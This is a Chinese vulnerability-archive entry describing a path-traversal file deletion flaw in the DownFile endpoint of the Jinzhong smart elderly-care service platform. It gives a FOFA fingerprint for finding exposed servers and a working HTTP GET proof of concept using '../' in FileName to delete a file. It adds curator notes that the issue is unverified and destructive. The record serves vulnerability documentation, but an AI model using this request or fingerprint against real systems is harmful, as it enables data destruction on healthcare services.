---
source: "wy876 漏洞文库"
title: "金中智慧医养服务平台 DownFile FileName路径遍历删除"
product: "金中智慧医养服务平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，应用路径与文件写权限"
prerequisites: "未说明"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ip0u6yn44ecxty0g"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%87%91%E4%B8%AD%E8%BD%AF%E4%BB%B6/%E5%B9%BF%E8%A5%BF%E9%87%91%E4%B8%AD%E8%BD%AF%E4%BB%B6%E9%9B%86%E5%9B%A2%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%99%BA%E6%85%A7%E5%8C%BB%E5%85%BB%E6%9C%8D%E5%8A%A1%E5%B9%B3%E5%8F%B0DownFile%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"Content/css/Login/images/gtx-main-bg00004.png\""
fofa_unverified: "body="
id: "vw-34c1fcbf23e690b97fe2bb49"
entity_id: "ve-34c1fcbf23e690b97fe2bb49"
schema_version: "1"
---

# 金中智慧医养服务平台 DownFile FileName路径遍历删除

## 条目说明

- 对象与具体问题：金中智慧医养服务平台；DownFile FileName路径遍历删除
- 版本、配置及部署条件：版本未知，应用路径与文件写权限
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 接口名DownFile但正文声称删除，需源码或前后状态证明具体删除机制
- 示例真实删除测试ASPX，具破坏性医疗业务风险，必须显著警示并只用可恢复自建文件
- 步骤1/3只有断言无请求响应；与560上传同路径可构成链但不自动证明
- 缺版本、鉴权、修复

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
广西金中软件集团有限公司前身成立于1999年，隶属于广西电信下的三产公司——金中信息产业有限公司，是一家集软件开发、网站建设、网络工程、系统集成和维护服务、通信增值业务和ISP运营服务于一体的高科技IT企业。广西金中软件集团有限公司智慧医养服务平台DownFile存在任意文件删除漏洞。

## 二、影响版本
+ 智慧医养服务平台

## 三、资产测绘
+ fofa`body="Content/css/Login/images/gtx-main-bg00004.png"`
+ 特征


## 四、漏洞复现
1. 当前文件存在

```plain
/Content/Upload/202407/18/1.aspx
```


2. poc

```http
GET /DevApi/DownFile?FileName=../Content/Upload/202407/18/1.aspx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
```


3. 当前文件已被删除


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ip0u6yn44ecxty0g>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
